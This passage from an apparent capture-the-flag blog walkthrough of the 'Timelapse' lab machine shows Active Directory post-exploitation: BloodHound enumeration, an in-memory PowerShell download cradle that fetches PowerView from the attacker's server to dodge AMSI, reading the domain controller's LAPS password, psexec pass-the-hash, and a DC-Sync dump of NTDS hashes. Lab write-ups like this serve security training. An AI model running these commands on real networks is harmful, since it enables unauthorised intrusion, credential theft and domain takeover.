<h3 id="performing-a-bloodhound-collection">Performing a bloodhound collection:</h3>
<ul>
<li>Now that we have some credentials we can perform a bloodhound collection.
<ul>
<li><code>bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-202819_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="finding-out-svc-deploy-has-readlapspassword-privileges-over-the-dc">Finding out svc_deploy has ReadLAPSPassword privileges over the DC:</h3>
<ul>
<li>Looking at bloodhound we can see that we are part of the LAPS_READERS groups which has <code>ReadLAPSPassword</code> privileges over the DC01, so we can read the machines password.
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-203131_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="retrieving-dc01-laps-password-with-powerview-via-download-cradle">Retrieving DC01 LAPS Password with PowerView via download cradle:</h3>
<ul>
<li>
<p>To avoid AMSI I decide to use <code>PowerView.ps1</code> with a download cradle. This means I can use a download cradle to load the script directly into memory without needing to download anything onto the host itself.</p>
<ul>
<li>+Note+: I know there are linux tool to extract the LAPS password however I wanted to use this methodology as an exercise.</li>
</ul>
</li>
<li>
<p><strong>I stand up my python server</strong>:</p>
<ul>
<li><code>python3 -m http.server 9000</code></li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>On the target from an evil-winrm admin shell I use a download cradle to load the sript into memory</strong>:
<ul>
<li><code>iex(new-object net.webclient).downloadstring('http://10.10.14.97:9000/PowerView.ps1')</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-203907_.png">
</figure>
</li>
<li><figure><img src="/ox-hugo/2024-11-10-203934_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>Let&rsquo;s create a secure string, using svc_deploy&rsquo;s creds</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="$SecPassword%20=%20ConvertTo-SecureString%20%27[svc_password]%27%20-AsPlainText%20-Force">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$SecPassword = ConvertTo-SecureString <span style="color:#e6db74">&#39;[svc_password]&#39;</span> -AsPlainText -Force</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-204304_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Create Credential Object for Authentication</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="$Cred%20=%20New-Object%20System.Management.Automation.PSCredential%28%27timelapse.htb%5csvc_deploy%27,%20$SecPassword%29">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$Cred = New-Object System.Management.Automation.PSCredential(<span style="color:#e6db74">&#39;timelapse.htb\svc_deploy&#39;</span>, $SecPassword)</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-204346_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>
<p><strong>Retrieve LAPS Password Using the Service Account</strong>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="Get-DomainObject%20DC01%20-Credential%20$Cred%20-Properties%20%22ms-mcs-AdmPwd%22,name">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainObject DC01 -Credential $Cred -Properties <span style="color:#e6db74">&#34;ms-mcs-AdmPwd&#34;</span>,name</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-11-10-204410_.png">
</figure>
</li>
<li>+Note+: The LAPS password is stored in the &ldquo;<code>ms-mcs-AdmPwd</code>&rdquo; attribute.</li>
</ul>
</li>
<li>
<p><strong>Now that we have the</strong> <code>LAPS</code> <strong>password we can authenticate as the administrator</strong>:</p>
<ul>
<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-205437_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Grabbing our flag</strong>:
<ul>
<li><code>impacket-psexec $domain/$user@$box -hashes :$hash</code></li>
<li>There was no flag on the Administrators desktop.
<ul>
<li><figure><img src="/ox-hugo/2024-11-11-054537_.png">
</figure>
</li>
</ul>
</li>
<li>Looking through the box though there are other users; as we have enumerated all other users desktop let&rsquo;s check out TRX.
<ul>
<li><figure><img src="/ox-hugo/2024-11-11-054635_.png">
</figure>
</li>
</ul>
</li>
<li>Flag found:
<ul>
<li><figure><img src="/ox-hugo/2024-11-11-054723_.png">
</figure>
</li>
</ul>
</li>
<li>+Note+:
<ul>
<li>I had to use psexec as winrm stopped working (and continued to not work even after box resets)</li>
<li>I had to actually perform this after the DC-Sync to retrieve the administrator hash as I could not use evil-winrm and the LAPS password to connect. I have since checked some known walktrhoughs and you should be able to authenticate so maybe I just got unlucky. So if you encounter the same issue, jump to my persistence section to view how to DC-Sync and then use the above approach.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-dot-persistence">4. Persistence:</h2>
<h3 id="dumping-ntds-dot-dit-dc-sync-attack">Dumping NTDS.dit/DC-SYNC attack:</h3>
<ul>
<li>
<p><strong>Perform DC-Sync attack using netexec</strong>:</p>
<ul>
<li><code>netexec smb $box -u $user -p $pass -M ntdsutil</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-205616_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Extract all hashes from netexec</strong></p>
<ul>
<li><code>for file in /home/kali/.nxc/logs/*.ntds; do cat &quot;$file&quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\n'; done</code></li>
<li><figure><img src="/ox-hugo/2024-11-10-205712_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="lessons-learned">Lessons Learned:</h2>
<h3 id="what-did-i-learn">What did I learn?</h3>
<ol>
<li>I learned alot about extracting credentials from .pfx files. That was fun.</li>
<li>I learned that even if the box is being finnicky there will be a way to work around it.</li>
</ol>
<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
<ol>
<li>Not terrible this time. Nothing to write home about.</li>
</ol>
<h2 id="sign-off">Sign off:</h2>
<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
<p>Until next time, hack the planet!</p>
<p>‚Äì Bloodstiller</p>
<p>‚Äì Get in touch bloodstiller at proton dot me</p>

            
        </div>
    </article>

        </main>

        <footer class="footer">
    <div class="footer-left">
        <ul class="social">
            
                <li>All Rights Reserved ¬Æ.</li>
            

            
                <li>Bloodstiller</li>
            

            
                
            
                
            
                
                    <li>
                        
                            <a href="https://github.com/bloodstiller" target="_blank">
                                <i class="bi-github"></i>
                            </a>
                        

                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </div>

    <div class="footer-right">
        <ul class="control status clearfix">
            
                <li>
                    
                        Word Count:
                        2932
                    
                </li>
            


            
                <li>en</li>
            

            

            

            
                <li>
                    
                        Last modified: &nbsp;
                        <time>
                            Nov 11 2024 00:00:00
                        </time>
                    
                </li>
            

            
        </ul>
    </div>
</footer>

    </body>

    






















    
        
        <script
            type="text/javascript"
            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
    
        
        <script
            type="text/javascript"
            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
    















<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />




</html>
